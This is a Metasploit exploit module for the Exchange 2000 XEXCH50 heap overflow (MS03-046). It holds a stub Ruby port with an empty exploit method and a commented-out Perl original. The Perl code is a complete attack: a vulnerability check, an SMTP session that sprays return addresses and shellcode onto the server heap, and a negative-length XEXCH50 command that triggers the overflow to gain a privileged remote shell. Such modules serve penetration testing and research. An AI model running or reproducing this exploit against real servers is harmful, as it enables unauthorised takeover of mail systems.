require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Exchange 2000 MS03-46 Heap Overflow',
			'Description'    => %q{
				This is an exploit for the Exchange 2000 heap overflow. Due
				to the nature of the vulnerability, this exploit is not very
				reliable. This module has been tested against Exchange 2000
				SP0 and SP3 running a Windows 2000 system patched to SP4. It
				normally takes between one and ten tries to successfully
				obtain a shell. This exploit is *very* unreliable, we hope
				to provide a much more solid one in the near future.
					
			},
			'Author'         => [ 'hdm' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '2674'],
					[ 'MSB', 'MS03-046'],
					[ 'MIL', '20'],

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "\x00\x0a\x0d\x20\x3a\x3d\x2b\x22",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'win32, win2000',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Oct 15 2003',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::exchange2000_xexch50;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	'Name'  => 'Exchange 2000 MS03-46 Heap Overflow',
	'Version'  => '$Revision$',
	'Authors' => [ 'H D Moore <hdm [at] metasploit.com>', ],

	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'win2000' ],
	'Priv'  => 1,

	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 25],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
	  },

	'Payload' => {
		'Space'  => 1024,
		'BadChars'  => "\x00\x0a\x0d\x20:=+\x22",
	  },

	'Description'  => Pex::Text::Freeform(qq{
        This is an exploit for the Exchange 2000 heap overflow. Due
        to the nature of the vulnerability, this exploit is not very
        reliable. This module has been tested against Exchange 2000
        SP0 and SP3 running a Windows 2000 system patched to SP4. It
        normally takes between one and ten tries to successfully
        obtain a shell. This exploit is *very* unreliable, we hope
        to provide a much more solid one in the near future.
}),
	'Refs'  =>
	  [
		['OSVDB', '2674'],
		['MSB',   'MS03-046'],
		['MIL',   '20'],
	  ],

	'DefaultTarget' => 0,
	'Targets' => [['Exchange 2000', 0x0c900c90, 3000, 11000, 512]],

	'Keys' => ['exchange2000'],

	'DisclosureDate' => 'Oct 15 2003',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Check {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );
	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return $self->CheckCode('Connect');
	}

	my $res = $s->Recv(-1, 20);
	if ($res !~ /Microsoft/) {
		$s->Close();
		$self->PrintLine("[*] Target does not appear to be an exchange server");
		return $self->CheckCode('Safe');
	}

	$s->Send("EHLO X\r\n");
	$res = $s->Recv(-1, 3);
	if ($res !~ /XEXCH50/) {
		$s->Close();
		$self->PrintLine("[*] Target does not appear to be an exchange server");
		return $self->CheckCode('Safe');
	}

	$s->Send("MAIL FROM: metasploit\r\n");
	$res = $s->Recv(-1, 3);

	$s->Send("RCPT TO: administrator\r\n");
	$res = $s->Recv(-1, 3);

	$s->Send("XEXCH50 2 2\r\n");
	$res = $s->Recv(-1, 3);
	$s->Close();

	if ($res !~ /Send binary/) {
		$self->PrintLine("[*] Target has been patched");
		return $self->CheckCode('Safe');
	}

	$self->PrintLine("[*] Target appears to be vulnerable");
	return $self->CheckCode('Appears');
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   =$self->GetVar('EncodedPayload')->Payload;

	my $target = $self->Targets->[$target_idx];
	my ($tname, $retaddr) = @{$target};
	my $buff_len = $target->[2];

	$self->PrintLine(sprintf("[*] Trying '$tname' using return address 0x%.8x [$buff_len]", $retaddr));

	my $counter = 1;
	my @seencount = ();

	while (1) {
		if(! $seencount[$counter]) {
			$self->PrintLine("[*] Exploit attempt #$counter");
			$seencount[$counter]++;
		}

		$self->Print("[*] Connection 1: ");
		my $s = Msf::Socket::Tcp->new
		  (
			'PeerAddr'  => $target_host,
			'PeerPort'  => $target_port,
			'LocalPort' => $self->GetVar('CPORT'),
			'SSL'       => $self->GetVar('SSL'),
		  );
		if ($s->IsError) {
			$self->PrintLine('Error');
			sleep(5);
			next;
		}

		my $res = $s->Recv(-1, 3);
		if (! $res) {
			$self->PrintLine("Error");
			next;
		}

		if ($res !~ /Microsoft/) {
			$s->Close();
			$self->PrintLine("Error");
			$self->PrintLine("[*] Target does not appear to be running Exchange: $res");
			return;
		}

		$self->Print("EHLO ");
		$s->Send("EHLO X\r\n");
		$res = $s->Recv(-1, 3);
		if (! $res) { $self->PrintLine("Error"); next; }

		if ($res !~ /XEXCH50/) {
			$self->PrintLine("Error");
			$self->PrintLine("[*] Target is not running Exchange: $res");
			return;
		}

		$self->Print("MAIL ");
		$s->Send("MAIL FROM: metasploit\r\n");
		$res = $s->Recv(-1, 3);
		if (! $res) { $self->PrintLine("Error"); next; }

		$self->Print("RCPT ");
		$s->Send("RCPT TO: administrator\r\n");
		$res = $s->Recv(-1, 3);
		if (! $res) { $self->PrintLine("Error"); next; }

		# verify that the server is not patched
		$s->Send("XEXCH50 2 2\r\n");
		$res = $s->Recv(-1, 3);
		if (! $res) { $self->PrintLine("Error"); next; }

		$self->Print("XEXCH50 ");
		if ($res !~ /Send binary/) {
			$s->Close();
			$self->PrintLine("Error");
			$self->PrintLine("[*] Target is not vulnerable");
			return;
		}

		$s->Send("XX");
		$res = $s->Recv(-1, 3);
		if (! $res) { $self->PrintLine("Error"); next; }

		$self->Print("ALLOC ");

		# allocate heap memory
		my $dsize = (1024 * 1024 * 32);
		$s->Send("XEXCH50 $dsize 2\r\n");
		$res = $s->Recv(-1, 3);
		$self->PrintLine("OK");

		my $payload =  ((
				(pack("V", $retaddr) x (256 * 1024)).
				  $shellcode .  ("X" x 1024)
			) x 4
		  ). ("BEEF");

		$self->Print("[*] Uploading shellcode to remote heap: ");
		$s->Send($payload);
		$self->PrintLine("OK");

		$self->Print("[*] Connection 2: ");
		my $x = Msf::Socket::Tcp->new
		  (
			'PeerAddr'  => $target_host,
			'PeerPort'  => $target_port,
			'SSL'       => $self->GetVar('SSL'),
		  );
		if ($x->IsError) {
			$self->PrintLine('Error');
			next;
		}

		$res = $x->Recv(-1, 3);
		if (! $res) {
			$self->PrintLine("Error");
			$self->PrintLine("[*] No response");
			next;
		}

		$self->Print("EHLO ");
		$x->Send("EHLO X\r\n");
		$res = $x->Recv(-1, 3);
		if (! $res) { $self->PrintLine("Error"); next; }

		if ($res !~ /XEXCH50/) {
			$self->PrintLine("Error");
			$self->PrintLine("[*] Target is not running Exchange: $res");
			return;
		}

		$self->Print("MAIL ");
		$x->Send("MAIL FROM: metasploit\r\n");
		$res = $x->Recv(-1, 3);
		if (! $res) { $self->PrintLine("Error"); next; }

		$self->Print("RCPT ");
		$x->Send("RCPT TO: administrator\r\n");
		$res = $x->Recv(-1, 3);
		if (! $res) { $self->PrintLine("Error"); next; }

		$self->Print("XEXCH50 ");

		# allocate a negative value
		$x->Send("XEXCH50 -1 2\r\n");
		$res = $x->Recv(-1, 3);
		if (! $res) {
			$self->PrintLine("Error");
			$self->PrintLine("[*] No response");
			next;
		}
		$self->PrintLine("OK");

		$buff_len += $target->[4];
		if ($buff_len > $target->[3]) { $buff_len = $target->[2] }

		# send the massive buffer of our return address
		my $heapover = pack("V", $retaddr) x ($buff_len);

		$self->PrintLine("[*] Overwriting heap with payload jump ($buff_len)...");
		$x->Send($heapover);

		# reconnect until the service stops responding
		my $count = 0;
		$self->Print("[*] Starting reconnect sequences: ");

		while ($count < 10) {
			my $tmp = Msf::Socket::Tcp->new
			  (
				'PeerAddr'  => $target_host,
				'PeerPort'  => $target_port,
				'LocalPort' => $self->GetVar('CPORT'),
				'SSL'       => $self->GetVar('SSL'),
			  );

			if ($tmp->IsError) {
				last;
			}

			$tmp->Send("HELO X\r\n");
			$tmp->Close();
			$count++;
		}
		$self->PrintLine(" OK");
		$self->PrintLine("");
		$counter++;
	}
	return;
}


=end


end
end	
